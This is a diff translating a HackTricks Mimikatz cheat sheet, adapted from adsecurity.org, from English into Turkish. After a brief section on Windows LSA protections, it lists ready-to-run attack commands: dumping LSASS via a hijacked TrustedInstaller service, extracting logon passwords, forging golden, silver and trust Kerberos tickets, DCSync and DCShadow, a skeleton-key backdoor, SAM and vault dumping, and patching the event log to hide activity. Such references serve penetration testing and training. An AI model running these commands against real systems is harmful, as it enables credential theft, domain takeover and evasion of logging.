@@ -4,220 +4,209 @@
 
 <figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+**Mobil Güvenlik** konusundaki uzmanlığınızı 8kSec Akademisi ile derinleştirin. Kendi hızınızda ilerleyerek iOS ve Android güvenliğini öğrenin ve sertifika kazanın:
 
 {% embed url="https://academy.8ksec.io/" %}
 
-**This page is based on one from [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Check the original for further info!
+**Bu sayfa [adsecurity.org](https://adsecurity.org/?page_id=1821) adresinden alınmıştır**. Daha fazla bilgi için orijinaline bakın!
 
-## LM and Clear-Text in memory
+## Bellekte LM ve Düz Metin
 
-From Windows 8.1 and Windows Server 2012 R2 onwards, significant measures have been implemented to safeguard against credential theft:
+Windows 8.1 ve Windows Server 2012 R2'den itibaren, kimlik bilgisi hırsızlığına karşı önemli önlemler alınmıştır:
 
-- **LM hashes and plain-text passwords** are no longer stored in memory to enhance security. A specific registry setting, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ must be configured with a DWORD value of `0` to disable Digest Authentication, ensuring "clear-text" passwords are not cached in LSASS.
+- **LM hash'leri ve düz metin şifreler** artık güvenliği artırmak için bellekte saklanmamaktadır. "clear-text" şifrelerin LSASS'te önbelleğe alınmaması için _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ adlı belirli bir kayıt defteri ayarının `0` DWORD değeri ile yapılandırılması gerekmektedir.
 
-- **LSA Protection** is introduced to shield the Local Security Authority (LSA) process from unauthorized memory reading and code injection. This is achieved by marking the LSASS as a protected process. Activation of LSA Protection involves:
-  1. Modifying the registry at _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ by setting `RunAsPPL` to `dword:00000001`.
-  2. Implementing a Group Policy Object (GPO) that enforces this registry change across managed devices.
+- **LSA Koruması**, Yerel Güvenlik Otoritesi (LSA) sürecini yetkisiz bellek okuma ve kod enjeksiyonuna karşı korumak için tanıtılmıştır. Bu, LSASS'in korunan bir süreç olarak işaretlenmesiyle sağlanır. LSA Korumasının etkinleştirilmesi şunları içerir:
+1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ kayıt defterini değiştirerek `RunAsPPL` değerini `dword:00000001` olarak ayarlamak.
+2. Bu kayıt defteri değişikliğini yönetilen cihazlar arasında zorunlu kılan bir Grup Politika Nesnesi (GPO) uygulamak.
 
-Despite these protections, tools like Mimikatz can circumvent LSA Protection using specific drivers, although such actions are likely to be recorded in event logs.
+Bu korumalara rağmen, Mimikatz gibi araçlar belirli sürücüleri kullanarak LSA Korumasını aşabilir, ancak bu tür eylemlerin olay günlüklerinde kaydedilmesi muhtemeldir.
 
-### Counteracting SeDebugPrivilege Removal
+### SeDebugPrivilege Kaldırma ile Mücadele
 
-Administrators typically have SeDebugPrivilege, enabling them to debug programs. This privilege can be restricted to prevent unauthorized memory dumps, a common technique used by attackers to extract credentials from memory. However, even with this privilege removed, the TrustedInstaller account can still perform memory dumps using a customized service configuration:
-
+Yönetici kullanıcılar genellikle programları hata ayıklama yeteneği veren SeDebugPrivilege'e sahiptir. Bu ayrıcalık, yetkisiz bellek dökümünü önlemek için kısıtlanabilir; bu, saldırganların bellekten kimlik bilgilerini çıkarmak için kullandığı yaygın bir tekniktir. Ancak, bu ayrıcalık kaldırıldığında bile, TrustedInstaller hesabı özelleştirilmiş bir hizmet yapılandırması kullanarak bellek dökümleri gerçekleştirebilir:
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-
-This allows the dumping of the `lsass.exe` memory to a file, which can then be analyzed on another system to extract credentials:
-
+Bu, `lsass.exe` belleğinin bir dosyaya dökülmesini sağlar; bu dosya daha sonra başka bir sistemde analiz edilerek kimlik bilgileri çıkarılabilir:
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
 # sekurlsa::logonpasswords
 ```
+## Mimikatz Seçenekleri
 
-## Mimikatz Options
+Mimikatz'ta olay günlüğü manipülasyonu iki ana eylemi içerir: olay günlüklerini temizleme ve yeni olayların kaydedilmesini önlemek için Olay hizmetini yamanma. Aşağıda bu eylemleri gerçekleştirmek için komutlar bulunmaktadır:
 
-Event log tampering in Mimikatz involves two primary actions: clearing event logs and patching the Event service to prevent logging of new events. Below are the commands for performing these actions:
+#### Olay Günlüklerini Temizleme
 
-#### Clearing Event Logs
+- **Komut**: Bu eylem, olay günlüklerini silmeyi amaçlar, böylece kötü niyetli faaliyetleri takip etmeyi zorlaştırır.
+- Mimikatz, standart belgelerinde olay günlüklerini doğrudan komut satırı aracılığıyla temizlemek için doğrudan bir komut sağlamaz. Ancak, olay günlüğü manipülasyonu genellikle belirli günlükleri temizlemek için Mimikatz dışında sistem araçları veya betikler kullanmayı içerir (örneğin, PowerShell veya Windows Olay Görüntüleyici kullanarak).
 
-- **Command**: This action is aimed at deleting the event logs, making it harder to track malicious activities.
-- Mimikatz does not provide a direct command in its standard documentation for clearing event logs directly via its command line. However, event log manipulation typically involves using system tools or scripts outside of Mimikatz to clear specific logs (e.g., using PowerShell or Windows Event Viewer).
+#### Deneysel Özellik: Olay Hizmetini Yamama
 
-#### Experimental Feature: Patching the Event Service
+- **Komut**: `event::drop`
+- Bu deneysel komut, Olay Günlüğü Hizmeti'nin davranışını değiştirmek için tasarlanmıştır ve etkili bir şekilde yeni olayların kaydedilmesini önler.
+- Örnek: `mimikatz "privilege::debug" "event::drop" exit`
 
-- **Command**: `event::drop`
-- This experimental command is designed to modify the Event Logging Service's behavior, effectively preventing it from recording new events.
-- Example: `mimikatz "privilege::debug" "event::drop" exit`
+- `privilege::debug` komutu, Mimikatz'ın sistem hizmetlerini değiştirmek için gerekli ayrıcalıklarla çalışmasını sağlar.
+- `event::drop` komutu daha sonra Olay Günlüğü hizmetini yamalar.
 
-- The `privilege::debug` command ensures that Mimikatz operates with the necessary privileges to modify system services.
-- The `event::drop` command then patches the Event Logging service.
+### Kerberos Bilet Saldırıları
 
-### Kerberos Ticket Attacks
+### Golden Ticket Oluşturma
 
-### Golden Ticket Creation
+Golden Ticket, alan genelinde erişim taklidi yapmayı sağlar. Ana komut ve parametreler:
 
-A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:
+- Komut: `kerberos::golden`
+- Parametreler:
+- `/domain`: Alan adı.
+- `/sid`: Alanın Güvenlik Tanımlayıcısı (SID).
+- `/user`: Taklit edilecek kullanıcı adı.
+- `/krbtgt`: Alanın KDC hizmet hesabının NTLM hash'i.
+- `/ptt`: Bileti doğrudan belleğe enjekte eder.
+- `/ticket`: Bileti daha sonra kullanmak üzere kaydeder.
 
-- Command: `kerberos::golden`
-- Parameters:
-  - `/domain`: The domain name.
-  - `/sid`: The domain's Security Identifier (SID).
-  - `/user`: The username to impersonate.
-  - `/krbtgt`: The NTLM hash of the domain's KDC service account.
-  - `/ptt`: Directly injects the ticket into memory.
-  - `/ticket`: Saves the ticket for later use.
-
-Example:
-
+Örnek:
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
+### Silver Ticket Oluşturma
 
-### Silver Ticket Creation
+Silver Ticket'lar belirli hizmetlere erişim sağlar. Ana komut ve parametreler:
 
-Silver Tickets grant access to specific services. Key command and parameters:
+- Komut: Golden Ticket'e benzer ancak belirli hizmetleri hedef alır.
+- Parametreler:
+- `/service`: Hedef alınacak hizmet (örneğin, cifs, http).
+- Diğer parametreler Golden Ticket ile benzerdir.
 
-- Command: Similar to Golden Ticket but targets specific services.
-- Parameters:
-  - `/service`: The service to target (e.g., cifs, http).
-  - Other parameters similar to Golden Ticket.
-
-Example:
-
+Örnek:
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
+### Güven Bileti Oluşturma
 
-### Trust Ticket Creation
+Güven Biletleri, güven ilişkilerini kullanarak alanlar arasında kaynaklara erişim sağlamak için kullanılır. Ana komut ve parametreler:
 
-Trust Tickets are used for accessing resources across domains by leveraging trust relationships. Key command and parameters:
+- Komut: Golden Ticket'e benzer ancak güven ilişkileri için.
+- Parametreler:
+- `/target`: Hedef alanın FQDN'si.
+- `/rc4`: Güven hesabı için NTLM hash'i.
 
-- Command: Similar to Golden Ticket but for trust relationships.
-- Parameters:
-  - `/target`: The target domain's FQDN.
-  - `/rc4`: The NTLM hash for the trust account.
-
-Example:
-
+Örnek:
 ```bash
 mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
 ```
+### Ek Kerberos Komutları
 
-### Additional Kerberos Commands
+- **Biletleri Listeleme**:
 
-- **Listing Tickets**:
+- Komut: `kerberos::list`
+- Mevcut kullanıcı oturumu için tüm Kerberos biletlerini listeler.
 
-  - Command: `kerberos::list`
-  - Lists all Kerberos tickets for the current user session.
+- **Önbelleği Geç**:
 
-- **Pass the Cache**:
+- Komut: `kerberos::ptc`
+- Önbellek dosyalarından Kerberos biletlerini enjekte eder.
+- Örnek: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
-  - Command: `kerberos::ptc`
-  - Injects Kerberos tickets from cache files.
-  - Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
+- **Bileti Geç**:
 
-- **Pass the Ticket**:
+- Komut: `kerberos::ptt`
+- Başka bir oturumda Kerberos biletini kullanmaya olanak tanır.
+- Örnek: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
-  - Command: `kerberos::ptt`
-  - Allows using a Kerberos ticket in another session.
-  - Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
+- **Biletleri Temizle**:
+- Komut: `kerberos::purge`
+- Oturumdan tüm Kerberos biletlerini temizler.
+- Çatışmaları önlemek için bilet manipülasyon komutlarını kullanmadan önce faydalıdır.
 
-- **Purge Tickets**:
-  - Command: `kerberos::purge`
-  - Clears all Kerberos tickets from the session.
-  - Useful before using ticket manipulation commands to avoid conflicts.
+### Active Directory Manipülasyonu
 
-### Active Directory Tampering
+- **DCShadow**: Bir makineyi AD nesne manipülasyonu için geçici olarak DC olarak çalıştırır.
 
-- **DCShadow**: Temporarily make a machine act as a DC for AD object manipulation.
+- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
-  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
+- **DCSync**: Şifre verilerini talep etmek için bir DC'yi taklit eder.
+- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
-- **DCSync**: Mimic a DC to request password data.
-  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
+### Kimlik Bilgilerine Erişim
 
-### Credential Access
+- **LSADUMP::LSA**: LSA'dan kimlik bilgilerini çıkarır.
 
-- **LSADUMP::LSA**: Extract credentials from LSA.
+- `mimikatz "lsadump::lsa /inject" exit`
 
-  - `mimikatz "lsadump::lsa /inject" exit`
+- **LSADUMP::NetSync**: Bir bilgisayar hesabının şifre verilerini kullanarak bir DC'yi taklit eder.
 
-- **LSADUMP::NetSync**: Impersonate a DC using a computer account's password data.
+- _Orijinal bağlamda NetSync için özel bir komut sağlanmamıştır._
 
-  - _No specific command provided for NetSync in original context._
+- **LSADUMP::SAM**: Yerel SAM veritabanına erişim sağlar.
 
-- **LSADUMP::SAM**: Access local SAM database.
+- `mimikatz "lsadump::sam" exit`
 
-  - `mimikatz "lsadump::sam" exit`
+- **LSADUMP::Secrets**: Kayıt defterinde saklanan sırları şifrelerini çözer.
 
-- **LSADUMP::Secrets**: Decrypt secrets stored in the registry.
+- `mimikatz "lsadump::secrets" exit`
 
-  - `mimikatz "lsadump::secrets" exit`
+- **LSADUMP::SetNTLM**: Bir kullanıcı için yeni bir NTLM hash'i ayarlar.
 
-- **LSADUMP::SetNTLM**: Set a new NTLM hash for a user.
+- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
+- **LSADUMP::Trust**: Güven bilgilerini alır.
+- `mimikatz "lsadump::trust" exit`
 
-- **LSADUMP::Trust**: Retrieve trust authentication information.
-  - `mimikatz "lsadump::trust" exit`
+### Çeşitli
 
-### Miscellaneous
+- **MISC::Skeleton**: LSASS'a bir arka kapı enjekte eder.
+- `mimikatz "privilege::debug" "misc::skeleton" exit`
 
-- **MISC::Skeleton**: Inject a backdoor into LSASS on a DC.
-  - `mimikatz "privilege::debug" "misc::skeleton" exit`
+### Yetki Yükseltme
 
-### Privilege Escalation
+- **PRIVILEGE::Backup**: Yedekleme haklarını edinir.
 
-- **PRIVILEGE::Backup**: Acquire backup rights.
+- `mimikatz "privilege::backup" exit`
 
-  - `mimikatz "privilege::backup" exit`
+- **PRIVILEGE::Debug**: Hata ayıklama ayrıcalıklarını elde eder.
+- `mimikatz "privilege::debug" exit`
 
-- **PRIVILEGE::Debug**: Obtain debug privileges.
-  - `mimikatz "privilege::debug" exit`
+### Kimlik Bilgisi Dökümü
 
-### Credential Dumping
+- **SEKURLSA::LogonPasswords**: Giriş yapmış kullanıcılar için kimlik bilgilerini gösterir.
 
-- **SEKURLSA::LogonPasswords**: Show credentials for logged-on users.
+- `mimikatz "sekurlsa::logonpasswords" exit`
 
-  - `mimikatz "sekurlsa::logonpasswords" exit`
+- **SEKURLSA::Tickets**: Bellekten Kerberos biletlerini çıkarır.
+- `mimikatz "sekurlsa::tickets /export" exit`
 
-- **SEKURLSA::Tickets**: Extract Kerberos tickets from memory.
-  - `mimikatz "sekurlsa::tickets /export" exit`
+### Sid ve Token Manipülasyonu
 
-### Sid and Token Manipulation
+- **SID::add/modify**: SID ve SIDHistory'yi değiştirir.
 
-- **SID::add/modify**: Change SID and SIDHistory.
+- Ekle: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
+- Değiştir: _Orijinal bağlamda değiştirme için özel bir komut yoktur._
 
-  - Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-  - Modify: _No specific command for modify in original context._
+- **TOKEN::Elevate**: Token'ları taklit eder.
+- `mimikatz "token::elevate /domainadmin" exit`
 
-- **TOKEN::Elevate**: Impersonate tokens.
-  - `mimikatz "token::elevate /domainadmin" exit`
+### Terminal Hizmetleri
 
-### Terminal Services
+- **TS::MultiRDP**: Birden fazla RDP oturumuna izin verir.
 
-- **TS::MultiRDP**: Allow multiple RDP sessions.
+- `mimikatz "ts::multirdp" exit`
 
-  - `mimikatz "ts::multirdp" exit`
-
-- **TS::Sessions**: List TS/RDP sessions.
-  - _No specific command provided for TS::Sessions in original context._
+- **TS::Sessions**: TS/RDP oturumlarını listeler.
+- _Orijinal bağlamda TS::Sessions için özel bir komut sağlanmamıştır._
 
 ### Vault
 
-- Extract passwords from Windows Vault.
-  - `mimikatz "vault::cred /patch" exit`
+- Windows Vault'tan şifreleri çıkarır.
+- `mimikatz "vault::cred /patch" exit`
 
 <figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+**Mobil Güvenlik** konusundaki uzmanlığınızı 8kSec Akademi ile derinleştirin. Kendi hızınızda kurslar aracılığıyla iOS ve Android güvenliğini öğrenin ve sertifika kazanın:
 
 {% embed url="https://academy.8ksec.io/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
